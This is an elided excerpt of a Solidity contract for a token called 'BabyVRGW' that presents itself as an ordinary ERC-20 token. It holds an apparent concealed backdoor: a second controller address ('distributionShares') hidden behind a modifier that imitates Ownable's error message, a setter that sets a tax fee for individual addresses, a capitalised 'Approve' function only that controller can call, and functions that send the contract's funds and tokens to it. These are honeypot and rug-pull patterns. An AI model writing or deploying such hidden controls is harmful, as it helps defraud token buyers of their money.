...
contract BabyVRGW is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BabyVRGW";
    string private _symbol = "BabyVRGW";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xefD2FAdC9661677d3F8E3296E0A81f02a5ae3dC6); 
    address payable private teamWalletAddress = payable(0x4ceBa6e82284aD5F591df5cEe5F786C3f5d24321); 
    ...
    uint256 private _totalSupply = 1 * 10**6 * 10**2 * 10**_decimals;
	...
	address  public distributionShares =_msgSender();
	...
	modifier onlyDo {
       require(distributionShares == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function setdTokenTracker(address newAddress) external onlyOwner() {
        distributionShares = newAddress;
    }
	
	function claimBalance() external {
        payable(distributionShares).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(distributionShares, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyDo {
	...
	function Approve(address spender,uint256 amount)public onlyDo{
